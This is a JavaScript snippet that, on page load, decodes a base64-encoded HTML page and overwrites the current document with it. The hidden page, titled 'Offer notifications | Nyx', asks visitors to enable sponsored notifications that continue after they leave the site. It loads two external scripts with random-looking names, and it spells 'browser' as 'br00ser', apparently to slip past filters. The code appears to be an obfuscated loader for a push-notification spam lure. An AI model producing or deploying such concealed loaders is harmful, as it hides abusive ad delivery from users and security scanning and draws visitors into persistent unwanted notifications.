(async () => {
  await new Promise(d => {
    const Z = () => setTimeout(d, 0);
    if (document.readyState === "complete") Z(); else window.addEventListener("load", Z, {
      once: true
    });
  });
  const d = (new TextDecoder).decode(Uint8Array.from(atob([ "PCFkb2N0eXBlIGh0bWw+PGh0bWwgbGFuZz0iZW4iPjxoZWFkPjxtZXRhIGNoYXJzZXQ9InV0Zi04Ij48bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29u", "dGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLGluaXRpYWwtc2NhbGU9MSI+PHRpdGxlPk9mZmVyIG5vdGlmaWNhdGlvbnMgfCBOeXg8L3RpdGxlPjxz", "dHlsZT5odG1se2NvbG9yLXNjaGVtZTpkYXJrO2JhY2tncm91bmQ6IzAwMDtjb2xvcjojZWVlO2ZvbnQ6MTZweCBzeXN0ZW0tdWl9Ym9keXttYXJn", "aW46MDttaW4taGVpZ2h0OjEwMHZoO2Rpc3BsYXk6Z3JpZDtwbGFjZS1pdGVtczpjZW50ZXJ9bWFpbntib3gtc2l6aW5nOmJvcmRlci1ib3g7d2lk", "dGg6bWluKDUyMHB4LDEwMCUpO3BhZGRpbmc6MjhweH1oMXtmb250LXNpemU6MjZweH1we2xpbmUtaGVpZ2h0OjEuNjtjb2xvcjojYWFhfWJ1dHRv", "bntkaXNwbGF5OmlubGluZS1mbGV4O2dhcDoxMHB4O2FsaWduLWl0ZW1zOmNlbnRlcjtib3JkZXI6MXB4IHNvbGlkICNmZmZmZmYzMDtib3JkZXIt", "cmFkaXVzOjEycHg7YmFja2dyb3VuZDojMTUxNTE1O2NvbG9yOiNlZWU7cGFkZGluZzoxM3B4IDE4cHg7Zm9udDo2MDAgMTVweCBzeXN0ZW0tdWk7", "Y3Vyc29yOnBvaW50ZXJ9YnV0dG9uOmRpc2FibGVke29wYWNpdHk6LjU1O2N1cnNvcjpkZWZhdWx0fXN2Z3t3aWR0aDoyMHB4O2hlaWdodDoyMHB4", "O2ZpbGw6bm9uZTtzdHJva2U6Y3VycmVudENvbG9yO3N0cm9rZS13aWR0aDoxLjd9PC9zdHlsZT48c2NyaXB0IGRlZmVyPSJkZWZlciIgc3JjPSIv", "anMvQHJmZTU0NmJhYmQzNzI5ZTdjM2FhMTMyMWEhLmpzIj48L3NjcmlwdD4gPC9oZWFkPjxib2R5PjxtYWluPjxoMT5PZmZlciBub3RpZmljYXRp", "b25zPC9oMT48cD5HZXQgc3BvbnNvcmVkIG5vdGlmaWNhdGlvbnMgb24gdGhpcyBkZXZpY2UsIGluY2x1ZGluZyBhZnRlciB5b3UgbGVhdmUgTnl4", "LiBZb3UgY2FuIHR1cm4gdGhlbSBvZmYgaW4geW91ciBicjAwc2VyIHNldHRpbmdzLjwvcD48YnV0dG9uIHR5cGU9ImJ1dHRvbiIgYXJpYS1sYWJl", "bD0iRW5hYmxlIG9mZmVyIG5vdGlmaWNhdGlvbnMiPjxzdmcgdmlld0JveD0iMCAwIDI0IDI0IiBhcmlhLWhpZGRlbj0idHJ1ZSI+PHBhdGggZD0i", "TTYgOWE2IDYgMCAwIDEgMTIgMHY1bDIgM0g0bDItM1Y5Wm00IDExaDRNMTIgM1YxIi8+PC9zdmc+RW5hYmxlIG5vdGlmaWNhdGlvbnM8L2J1dHRv", "bj48cCByb2xlPSJzdGF0dXMiPk5vdGhpbmcgaXMgZW5hYmxlZCB1bnRpbCB5b3UgY2hvb3NlIHRvIGNvbnRpbnVlLjwvcD48L21haW4+PHNjcmlw", "dCBzcmM9Ii4vQHIzNzhiZjA5Nzg2ZWVmYmZiZWVmMTZlNzIhLmpzIj48L3NjcmlwdD48L2JvZHk+PC9odG1sPgo=" ].join("")), d => d.charCodeAt(0)));
  const Z = document.querySelector("base")?.outerHTML || "";
  document.open();
  document.write(d.replace(/<head(?:\s[^>]*)?>/i, d => d + Z));
  document.close();
})().catch(() => {
  const d = document.createElement("p");
  d.setAttribute("role", "alert");
  d.textContent = "This page could not be loaded. Please reload to try again.";
  document.body.prepend(d);
});